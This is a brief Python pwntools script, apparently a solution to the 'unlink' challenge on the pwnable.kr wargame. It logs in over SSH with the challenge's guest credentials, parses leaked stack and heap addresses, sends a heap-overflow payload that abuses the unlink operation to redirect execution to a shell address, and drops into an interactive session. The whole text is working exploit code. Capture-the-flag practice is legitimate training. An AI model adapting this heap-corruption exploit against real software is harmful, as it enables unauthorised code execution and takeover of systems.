from pwn import *

shellcode_addr = 0x080484eb

conn = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
p = conn.process("./unlink")

p.recvuntil("stack address leak: ")
stack_addr = int(p.recv(10), 16)
p.recvuntil("heap address leak: ")
heap_addr = int(p.recv(10), 16)

payload = p32(shellcode_addr) + 'a'*12 + p32(heap_addr + 12) + p32(stack_addr + 16)

p.send(payload)
p.interactive()